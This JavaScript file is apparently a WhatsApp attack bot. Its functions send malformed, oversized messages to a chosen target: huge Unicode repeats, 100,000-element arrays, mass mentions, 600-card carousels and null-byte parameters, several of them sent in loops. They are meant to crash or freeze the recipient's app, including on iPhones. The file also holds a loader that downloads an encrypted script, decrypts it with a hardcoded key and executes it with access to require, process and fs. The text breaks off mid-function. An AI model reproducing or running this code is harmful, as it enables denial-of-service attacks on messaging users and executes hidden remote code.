const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function ofmcrl_group(WaSocket, target) {
  for (let z = 0; z < 60; z++) {
    
  await WaSocket.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+2
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }
        ]
      },
      contextInfo: {
        mentionedJid: Array.from(
          { length: 1000 },
          () => `13135550007@s.whatsapp.net`
        )
      },
    },
    {}
  );
   
      await sleep(1000);
      
    let tagMeta = Array.from(
      { length: 1000 },
      () => `13135550007@s.whatsapp.net`
    );
    const x = generateWAMessageFromContent(target, {
      ptvMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/620054416_3852114991764617_2631483295655159819_n.enc?ccb=11-4&oh=01_Q5Aa4QGKXRyOkmWHnu-gsRiPTO-esYHqwg7sCzOhzmv1o04tBw&oe=6A048B31&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "oCD8z5XCtlvSP23UPbDbEGlR4cZ/ZpDHCPYiUzlP890=",
        fileLength: 409442,
        seconds: 4,
        mediaKey: "99ol5xpojBVUxPRXSdfcRkvo3KtGlLtuQe9XcC93iMY=",
        height: 480,
        width: 480,
        fileEncSha256: "6h/SsT9iCK6ZRA6e9I0v145eZf02vwffTWMinttHCBc=",
        directPath: "/v/t62.7161-24/620054416_3852114991764617_2631483295655159819_n.enc?ccb=11-4&oh=01_Q5Aa4QGKXRyOkmWHnu-gsRiPTO-esYHqwg7sCzOhzmv1o04tBw&oe=6A048B31&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1776090810,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAArAAADAQEBAAAAAAAAAAAAAAAAAwQFAQIBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAANrwZQxFoTL0lCdCeA2xYZ1EFp6q5AaSs4H+64hIgH159ZfFZkkOsnpqSPhPAgH00ZBZVJ0u5OgZz1njjSBiwM9QDJwKdABgB//EACkQAAICAQMDAwMFAAAAAAAAAAECAAMRBBIxEBMhIjJBBVFxFEJDYoH/2gAIAQEAAT8AjuqDLGPqrLTtqWFHdtr2HJMbRYU+owJYmAjnIi6qyo4tWJYrjIPSxxWpYxmbUnJ9kq2AAgYxzGCM+4DJgZsZ2mKFRmZhzLBWUJb5iO1BBHt+RK7BYoImrc22LUsCKEC8ERF+/EVVA8dLWRR6oyMQrAePtO2rIQBnM0zGm1qjKy72u6jMAckK0KAriWXW1cecQ/VE2cev7TTB7rO5ZMDELmtiolxZbEczQ8v+Z/MOmr24mdN3f7zSFejY7s1uMJ+ZS5pexQINwKu0BGMzU773KV/6YPplWzHzK6LaTzkCK+VzHyzlhLSXdEmqQ1WLaom5Xq3E/ERzgKT4iIij09CR8x7F8gQMgQkHGJpkNtpsIliCxSDLFejK/slKqU5yTC4RtoJhNnOfEVw7YLGP21UgxVe9sD2yqsVqAOj1q4wRG0tlRLVNO46tl65+uGPYZl2YNWhi6a20g2mV1rWMAdP/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/AE//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AE//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          participant: target,
          mentionedJid: tagMeta,
          quotedMessage: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091",
            }
          },
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 100000 }, () => ({
            type: 1
          })),
          remoteJid: "status@broadcast"
        },
    streamingSidecar: "wP8MhbnE2HuVfwFsiGFzm6g/mIOdReFkP1d9qAHSTEYZjj2wH7VWipWdWNUp4zOyQTIB8v1wrpJjjpQ9WyOZyCardyzc6A=="
      }
    }, {})

    await WaSocket.relayMessage(target, x.message, {
      //participant: { jid: target }
    })
  }
}

async function ptvc(WaSocket, target) {
  for (let z = 0; z < 100; z++) {
    let tagMeta = Array.from(
      { length: 1000 },
      () => `13135550007@s.whatsapp.net`
    );
    const x = generateWAMessageFromContent(target, {
      ptvMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/620054416_3852114991764617_2631483295655159819_n.enc?ccb=11-4&oh=01_Q5Aa4QGKXRyOkmWHnu-gsRiPTO-esYHqwg7sCzOhzmv1o04tBw&oe=6A048B31&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "oCD8z5XCtlvSP23UPbDbEGlR4cZ/ZpDHCPYiUzlP890=",
        fileLength: 409442,
        seconds: 4,
        mediaKey: "99ol5xpojBVUxPRXSdfcRkvo3KtGlLtuQe9XcC93iMY=",
        height: 480,
        width: 480,
        fileEncSha256: "6h/SsT9iCK6ZRA6e9I0v145eZf02vwffTWMinttHCBc=",
        directPath: "/v/t62.7161-24/620054416_3852114991764617_2631483295655159819_n.enc?ccb=11-4&oh=01_Q5Aa4QGKXRyOkmWHnu-gsRiPTO-esYHqwg7sCzOhzmv1o04tBw&oe=6A048B31&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1776090810,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAArAAADAQEBAAAAAAAAAAAAAAAAAwQFAQIBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAANrwZQxFoTL0lCdCeA2xYZ1EFp6q5AaSs4H+64hIgH159ZfFZkkOsnpqSPhPAgH00ZBZVJ0u5OgZz1njjSBiwM9QDJwKdABgB//EACkQAAICAQMDAwMFAAAAAAAAAAECAAMRBBIxEBMhIjJBBVFxFEJDYoH/2gAIAQEAAT8AjuqDLGPqrLTtqWFHdtr2HJMbRYU+owJYmAjnIi6qyo4tWJYrjIPSxxWpYxmbUnJ9kq2AAgYxzGCM+4DJgZsZ2mKFRmZhzLBWUJb5iO1BBHt+RK7BYoImrc22LUsCKEC8ERF+/EVVA8dLWRR6oyMQrAePtO2rIQBnM0zGm1qjKy72u6jMAckK0KAriWXW1cecQ/VE2cev7TTB7rO5ZMDELmtiolxZbEczQ8v+Z/MOmr24mdN3f7zSFejY7s1uMJ+ZS5pexQINwKu0BGMzU773KV/6YPplWzHzK6LaTzkCK+VzHyzlhLSXdEmqQ1WLaom5Xq3E/ERzgKT4iIij09CR8x7F8gQMgQkHGJpkNtpsIliCxSDLFejK/slKqU5yTC4RtoJhNnOfEVw7YLGP21UgxVe9sD2yqsVqAOj1q4wRG0tlRLVNO46tl65+uGPYZl2YNWhi6a20g2mV1rWMAdP/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/AE//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AE//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          participant: target,
          mentionedJid: tagMeta,
          quotedMessage: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091",
            }
          },
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 100000 }, () => ({
            type: 1
          })),
          remoteJid: "status@broadcast"
        },
    streamingSidecar: "wP8MhbnE2HuVfwFsiGFzm6g/mIOdReFkP1d9qAHSTEYZjj2wH7VWipWdWNUp4zOyQTIB8v1wrpJjjpQ9WyOZyCardyzc6A=="
      }
    }, {})

    await WaSocket.relayMessage(target, x.message, {
      participant: { jid: target }
    })
  }
}

async function ofmcrl_groupX(WaSocket, target) {
const imageMessage = {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
fileLength: 162903,
height: 1080,
width: 1080,
mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
mediaKeyTimestamp: 1775033718,
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
contextInfo: {
pairedMediaType: "NOT_PAIRED_MEDIA",
/*urlTrackingMap: {
urlTrackingMapElements: Array.from(
{ length: 500000 }, () => ({ type: 1 })
)
}*/
},
scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
scanLengths: [
10365,
39303,
40429,
72806
],
midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
}

let cards = [];
for (let z = 0; z < 600; z++) {
cards.push({
header: {
imageMessage,
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: "\0"
}
})
}
let msg = generateWAMessageFromContent(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: { text: "\0" },
carouselMessage: {
cards
}
}
}
}
}, {});
await WaSocket.relayMessage(target, msg.message, {
participant: { jid:target }
});
}



async function iosExe(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 1; i++) {
       await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};



async function D3nsskaya(sock, target) {
    const flood = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm", "booking_status"];
    for (const x of flood) {
        const enty = Math.floor(Math.random() * flood.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0000",
                                format: "BOLD"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: flood[enty]
                        }
                    }
                }
